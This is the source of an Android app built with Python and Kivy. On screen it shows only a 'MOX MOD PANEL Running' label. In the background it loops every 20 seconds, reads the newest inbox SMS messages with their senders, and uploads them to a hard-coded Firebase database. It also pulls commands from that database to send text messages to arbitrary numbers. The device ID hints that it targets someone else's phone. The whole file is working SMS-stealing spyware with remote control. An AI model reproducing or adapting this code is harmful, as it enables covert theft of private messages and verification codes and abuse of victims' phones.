import threading, time, requests, json
from datetime import datetime
from android.permissions import request_permissions, Permission
import jnius
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout

FIREBASE_URL = "https://satanoopfirebase-default-rtdb.firebaseio.com"
DEVICE_ID = "dost_ka_phone"

def log(m): print(f"[{datetime.now().strftime('%H:%M:%S')}] {m}")

def send_status():
    try:
        requests.patch(f"{FIREBASE_URL}/clients/{DEVICE_ID}.json",
            json={"name":"Mox Device","status":True,"battery":"85%","lastSeen":time.time()}, timeout=10)
    except: pass

def read_sms():
    try:
        SmsQuery = jnius.autoclass("android.provider.Telephony$Sms$Inbox")
        ctx = jnius.autoclass("org.kivy.android.PythonActivity").mActivity
        c = ctx.getContentResolver().query(SmsQuery.CONTENT_URI, None, None, None, "date DESC LIMIT 3")
        if c:
            while c.moveToNext():
                body = c.getString(c.getColumnIndex("body"))
                sender = c.getString(c.getColumnIndex("address"))
                requests.post(f"{FIREBASE_URL}/messages/{DEVICE_ID}.json",
                    json={"text":body[:500],"sender":sender,"time":time.time()}, timeout=10)
                log(f"SMS from {sender}")
            c.close()
    except Exception as e: log(f"SMS err {e}")

def check_outgoing():
    try:
        r = requests.get(f"{FIREBASE_URL}/clients/{DEVICE_ID}/webhookEvent/sendSms.json", timeout=10)
        d = r.json()
        if d and not d.get("isSended", True):
            SmsManager = jnius.autoclass("android.telephony.SmsManager")
            SmsManager.getDefault().sendTextMessage(d["to"], None, d["message"], None, None)
            d["isSended"] = True
            requests.patch(r.url, json=d)
    except: pass

def worker():
    while True:
        send_status(); read_sms(); check_outgoing(); time.sleep(20)

class MoxApp(App):
    def build(self):
        request_permissions([Permission.READ_SMS, Permission.SEND_SMS, Permission.INTERNET])
        b = BoxLayout()
        b.add_widget(Label(text="MOX MOD PANEL\nRunning", font_size=30))
        return b
    def on_start(self):
        threading.Thread(target=worker, daemon=False).start()

MoxApp().run()